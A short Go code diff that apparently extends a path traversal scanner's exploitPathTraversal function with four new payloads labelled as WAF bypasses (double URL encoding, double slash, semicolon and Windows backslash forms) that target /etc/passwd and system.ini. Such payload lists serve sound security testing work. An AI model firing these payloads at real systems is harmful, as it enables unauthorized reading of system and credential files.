@@ -333,6 +333,18 @@ func (p *PathTraversalSpecialist) exploitPathTraversal(targetURL, parameter stri
 
 		// Alternative encodings
 		{"..%2f..%2f..%2fetc%2fpasswd", "root:", "Linux"},
+
+		// WAF bypass - Double URL encoding
+		{"..%252f..%252f..%252fetc%252fpasswd", "root:", "Linux"},
+
+		// WAF bypass - Double slash
+		{"....//....//....//etc/passwd", "root:", "Linux"},
+
+		// WAF bypass - Semicolon
+		{"..;/..;/..;/etc/passwd", "root:", "Linux"},
+
+		// WAF bypass - Backslash variation (Windows)
+		{"..\\..\\..\\windows\\system.ini", "[drivers]", "Windows"},
 	}
 
 	// Parallel testing
